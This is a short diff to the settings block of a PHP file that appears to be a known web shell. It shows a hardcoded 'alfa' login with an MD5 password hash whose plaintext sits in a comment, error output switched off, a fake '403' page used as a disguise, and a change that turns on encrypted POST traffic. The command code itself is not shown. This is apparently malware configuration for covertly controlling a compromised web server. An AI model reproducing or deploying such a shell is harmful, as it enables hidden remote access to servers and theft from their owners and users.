@@ -5,10 +5,10 @@ error_reporting(0);
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
     'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
-    'safe_mode' => '0',
+    'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => true,
     'cgi_api' => true,
 );
 
